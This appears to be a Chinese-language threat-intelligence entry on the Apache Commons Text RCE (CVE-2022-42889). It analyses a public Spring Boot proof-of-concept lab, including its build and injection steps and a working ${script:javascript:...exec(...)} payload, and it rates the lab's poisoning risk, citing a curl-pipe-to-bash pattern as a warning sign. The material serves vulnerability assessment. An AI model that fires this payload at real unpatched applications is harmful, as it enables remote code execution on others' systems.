## CVE-2022-42889 - Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** RCE

**影响应用:** Apache Commons Text

**危害等级:** Critical

**CVSS评分:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**影响版本:** 1.5 through 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text 库，并且将未经处理的用户输入传递给 StringLookup 对象的 replace() 或 lookup() 方法。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

POC有效性分析：该POC是一个完整的基于Spring Boot的实验环境，模拟了真实世界中由于开发人员直接将用户输入透传给Apache Commons Text解析器而导致的严重漏洞场景。通过分析提供的Dockerfile和pom.xml文件，该项目构建了一个暴露8080端口的Java Web应用。漏洞的核心在于Apache Commons Text的StringLookupFactory。在版本1.5到1.9中，默认启用了包括script、dns和url在内的多种插值器。POC通过构造特定的URL参数，利用${script:javascript:...}语法触发Nashorn引擎执行任意Java代码。该POC逻辑清晰，包含完整的构建说明（Maven构建Fat Jar）、容器化部署（Docker）以及具体的Payload示例（touch /tmp/foo），能够稳定复现漏洞。利用步骤：首先，通过Maven编译源代码生成可执行的Jar包；其次，使用Docker构建镜像并映射端口到宿主机；随后，通过浏览器或curl访问目标接口，在search参数中注入Payload。例如注入URL编码后的${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}；最后，进入容器内部检查/tmp/foo文件是否存在，以验证命令是否成功执行。投毒风险分析：该POC代码库结构透明，属于典型的安全研究演示项目。README中详细记录了每一步操作，且Payload仅为无害的‘touch’命令，用于证明文件系统写入权限。在分析其依赖项（pom.xml）和Dockerfile时，未发现可疑的外部链接下载、隐藏的二进制文件或混淆的Shell指令。其Maven依赖均指向标准的中央仓库，镜像基础层使用的是官方OpenJDK Alpine版本。虽然风险较低，但防御者在克隆此类仓库时仍需警惕。潜在风险点在于如果POC作者在fat jar中预埋恶意逻辑，或者在README提供的脚本链接中植入恶意后门。本样本中，由于代码完全开源且逻辑简单，基本可以判定为安全。然而，在真实威胁情报环境中，若发现POC包含未经过源代码验证的预编译Jar包、加密的二进制payload，或在脚本中包含curl/wget管道执行远程shell（如curl x.x.x.x | bash），则投毒风险将飙升至70%以上。

**项目地址:** [https://github.com/levo/text4shell-poc](https://www.google.com/search?q=https://github.com/levo/text4shell-poc) (推断自项目路径与内容)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/cve-2022-42889](https://nvd.nist.gov/vuln/detail/cve-2022-42889)
